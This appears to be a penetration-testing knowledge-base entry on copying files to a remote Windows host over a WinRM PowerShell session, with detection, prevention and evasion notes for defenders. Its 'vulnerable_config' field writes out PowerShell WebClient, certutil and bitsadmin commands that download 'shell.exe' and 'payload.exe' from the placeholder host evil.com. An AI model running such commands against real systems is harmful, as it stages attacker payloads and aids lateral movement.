examples.label: CPTS Ch07 — copy file to remote host via PSSession

notes: With a WinRM session, `Copy-Item -ToSession $s` / `-FromSession $s` moves files over the existing 5985/5986 channel - clean and native once you have creds. PSSession file transfers work over WinRM (port 5985/5986). Requires PowerShell remoting enabled on target. Blends with legitimate admin traffic. Also useful for lateral movement in AD environments. Also covered in: CPTS Ch07 (File Transfers).
name: WinRM - Copy via PowerShell Session
description: With a PowerShell Remoting (WinRM) session you can copy files to or from the remote host directly over the session - no separate server needed.

defense.why_it_works: An authenticated WinRM PowerShell session (Enter-PSSession / Copy-Item -ToSession) transfers files to a remote Windows host over WinRM (5985/5986) - a native remote-management channel.
defense.prerequisites: Valid credentials with WinRM access to the target and WinRM enabled/reachable.
defense.impact: Files staged on the remote host via a trusted management protocol, often as part of lateral movement.
defense.detection: WinRM logons (Event 4624 type 3 to 5985/5986) and PowerShell remoting operations; Copy-Item -ToSession and remoting cmdlets in script-block logs (4104); new file on the target.
defense.artifacts: WinRM connection on 5985/5986; 4104 remoting entries; the transferred file; the authenticating account in 4624.
defense.prevention: Restrict WinRM to management subnets/jump hosts; strong credential hygiene (WinRM needs valid creds); monitor remoting and Copy-Item -ToSession; JEA to constrain what remoting can do.
defense.evasion: WinRM is a legitimate admin channel, so with valid creds the transfer blends with normal management; traffic is encrypted (HTTPS on 5986).
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'

variations.description: Full WinRM file transfer workflow (check → connect → copy)
variations.command:
Test-NetConnection -ComputerName DATABASE01 -Port 5985
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
variations.label: Test + open session + copy file
